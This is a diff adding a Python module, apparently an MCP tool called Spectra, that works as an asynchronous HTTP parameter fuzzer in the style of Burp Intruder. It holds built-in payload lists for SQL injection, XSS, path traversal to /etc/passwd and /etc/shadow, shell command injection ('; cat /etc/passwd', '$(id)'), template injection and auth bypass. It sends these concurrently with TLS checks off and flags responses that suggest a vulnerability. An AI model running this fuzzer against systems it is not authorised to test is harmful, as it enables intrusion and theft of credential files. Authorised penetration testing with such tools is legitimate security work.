@@ -1,0 +1,253 @@
+"""
+Spectra MCP - Parameter Fuzzer / Mini-Intruder Engine
+High-performance asynchronous parameter fuzzing with position markers (§...§),
+automated baseline differential analysis, and offensive anomaly detection.
+"""
+
+import re
+import time
+import asyncio
+import urllib.parse
+from typing import Dict, Any, List, Optional, Tuple
+import httpx
+
+# Predefined curated pentest payload dictionaries
+BUILTIN_PAYLOADS = {
+    "sqli": [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "admin'--",
+        "' UNION SELECT NULL--",
+        "' UNION SELECT 1,2,3,4--",
+        "1' AND 1=2--",
+        "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--",
+        "1' ORDER BY 1--",
+        "1' ORDER BY 20--"
+    ],
+    "xss": [
+        "<script>alert(1)</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+        "'\"><svg/onload=alert(1)>",
+        "<iframe src=\"javascript:alert(1)\">",
+        "<details open ontoggle=alert(1)>",
+        "{{constructor.constructor('alert(1)')()}}"
+    ],
+    "traversal": [
+        "../../../../etc/passwd",
+        "..\\..\\..\\windows\\win.ini",
+        "....//....//....//etc/passwd",
+        "/etc/passwd%00",
+        "..%2f..%2f..%2fetc%2fpasswd",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "/etc/shadow"
+    ],
+    "cmd_injection": [
+        "; id",
+        "| whoami",
+        "$(id)",
+        "; cat /etc/passwd",
+        "& whoami",
+        "| dir",
+        "`whoami`"
+    ],
+    "ssti": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "{{config.items()}}",
+        "*{7*7}",
+        "#{7*7}"
+    ],
+    "auth_bypass": [
+        "admin",
+        "root",
+        "guest",
+        "true",
+        "false",
+        "0",
+        "1",
+        "null",
+        "undefined",
+        "NaN"
+    ]
+}
+
+MARKER_REGEX = re.compile(r"§([^§]*)§")
+
+SQL_ERROR_PATTERNS = [
+    r"you have an error in your sql syntax",
+    r"warning: mysql",
+    r"unclosed quotation mark after the character string",
+    r"quoted string not properly terminated",
+    r"pg_query\(\):",
+    r"sqlite3::sqlexception",
+    r"ora-01756",
+    r"syntax error at or near",
+    r"microsoft ole db provider for odbc drivers"
+]
+
+
+def extract_markers(text: str) -> List[Tuple[int, int, str]]:
+    """Finds all instances of §marker§ and returns (start, end, inner_value)."""
+    return [(m.start(), m.end(), m.group(1)) for m in MARKER_REGEX.finditer(text)]
+
+
+def replace_markers(template: str, replacement: str) -> str:
+    """Replaces all §...§ markers with the given replacement string."""
+    return MARKER_REGEX.sub(replacement, template)
+
+
+def has_markers(url: str, body: str, headers: Dict[str, str]) -> bool:
+    """Checks whether URL, body, or headers contain the §marker§ delimiter."""
+    if MARKER_REGEX.search(url):
+        return True
+    if body and MARKER_REGEX.search(body):
+        return True
+    for v in headers.values():
+        if MARKER_REGEX.search(str(v)):
+            return True
+    return False
+
+
+async def run_fuzz_attack(
+    base_url: str,
+    method: str = "GET",
+    headers: Optional[Dict[str, str]] = None,
+    body: Optional[str] = "",
+    payloads: Optional[List[str]] = None,
+    concurrency: int = 5,
+    upstream_proxy: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Executes a multi-threaded parameter fuzzing attack with automatic baseline comparison.
+    """
+    headers = headers or {}
+    body = body or ""
+    payloads = payloads or BUILTIN_PAYLOADS["sqli"]
+    method = method.upper().strip()
+
+    proxy_kwargs = {}
+    if upstream_proxy and upstream_proxy.strip():
+        proxy_kwargs["proxy"] = upstream_proxy.strip()
+
+    # Determine baseline template by stripping markers and keeping inner default value
+    baseline_url = MARKER_REGEX.sub(r"\1", base_url)
+    baseline_body = MARKER_REGEX.sub(r"\1", body)
+    baseline_headers = {k: MARKER_REGEX.sub(r"\1", str(v)) for k, v in headers.items()}
+
+    # 1. Baseline Request
+    baseline_result = {
+        "status_code": 0,
+        "length": 0,
+        "duration_ms": 0,
+        "response_body_preview": ""
+    }
+
+    try:
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15.0, **proxy_kwargs) as client:
+            t0 = time.time()
+            content_bytes = baseline_body.encode("utf-8") if baseline_body else None
+            res = await client.request(
+                method=method,
+                url=baseline_url,
+                headers=baseline_headers,
+                content=content_bytes
+            )
+            dur = int((time.time() - t0) * 1000)
+            baseline_result = {
+                "status_code": res.status_code,
+                "length": len(res.content),
+                "duration_ms": dur,
+                "response_body_preview": res.text[:500] if res.text else ""
+            }
+    except Exception as ex:
+        baseline_result["error"] = str(ex)
+
+    # 2. Concurrently execute attacks
+    sem = asyncio.Semaphore(concurrency)
+    results: List[Dict[str, Any]] = []
+
+    async def _fuzz_worker(index: int, payload: str):
+        req_url = replace_markers(base_url, payload)
+        req_body = replace_markers(body, payload)
+        req_headers = {k: replace_markers(str(v), payload) for k, v in headers.items()}
+
+        async with sem:
+            item = {
+                "id": index + 1,
+                "payload": payload,
+                "status_code": None,
+                "duration_ms": 0,
+                "length": 0,
+                "delta": 0,
+                "anomalies": [],
+                "error": None,
+                "preview": ""
+            }
+            try:
+                async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=20.0, **proxy_kwargs) as client:
+                    t0 = time.time()
+                    b_bytes = req_body.encode("utf-8") if req_body else None
+                    resp = await client.request(
+                        method=method,
+                        url=req_url,
+                        headers=req_headers,
+                        content=b_bytes
+                    )
+                    dur = int((time.time() - t0) * 1000)
+                    resp_len = len(resp.content)
+                    delta = resp_len - baseline_result["length"]
+                    item["status_code"] = resp.status_code
+                    item["duration_ms"] = dur
+                    item["length"] = resp_len
+                    item["delta"] = delta
+                    text = resp.text or ""
+                    item["preview"] = text[:600]
+
+                    # Anomaly Heuristics
+                    anomalies = []
+                    # 1. Reflected payload
+                    if payload in text:
+                        anomalies.append("REFLECTED")
+                    # 2. Status code shift
+                    if baseline_result["status_code"] and resp.status_code != baseline_result["status_code"]:
+                        anomalies.append(f"STATUS_{resp.status_code}")
+                    # 3. High length delta (> 20% or > 250 bytes)
+                    if abs(delta) > 250:
+                        anomalies.append("DELTA_LENGTH")
+                    # 4. Latency anomaly (e.g. sleep payload taking > 1800ms while baseline was < 500ms)
+                    if dur > 1800 and baseline_result["duration_ms"] < 600:
+                        anomalies.append("TIME_DELAY")
+                    # 5. SQL Error Leaks
+                    lower_text = text.lower()
+                    for pattern in SQL_ERROR_PATTERNS:
+                        if re.search(pattern, lower_text):
+                            anomalies.append("SQL_ERROR_LEAK")
+                            break
+                    # 6. SSTI arithmetic evaluation (e.g. 7*7 -> 49)
+                    if ("7*7" in payload) and ("49" in text) and ("49" not in baseline_result.get("response_body_preview", "")):
+                        anomalies.append("SSTI_EVALUATED_49")
+
+                    item["anomalies"] = anomalies
+            except Exception as e:
+                item["error"] = str(e)
+                item["anomalies"] = ["TRANSPORT_ERROR"]
+
+            results.append(item)
+
+    tasks = [_fuzz_worker(i, p) for i, p in enumerate(payloads)]
+    await asyncio.gather(*tasks)
+
+    # Sort results by ID
+    results.sort(key=lambda x: x["id"])
+
+    # Count anomalies
+    flagged_count = sum(1 for r in results if len(r["anomalies"]) > 0)
+
+    return {
+        "baseline": baseline_result,
+        "total_payloads": len(payloads),
+        "anomalies_detected": flagged_count,
+        "results": results
+    }
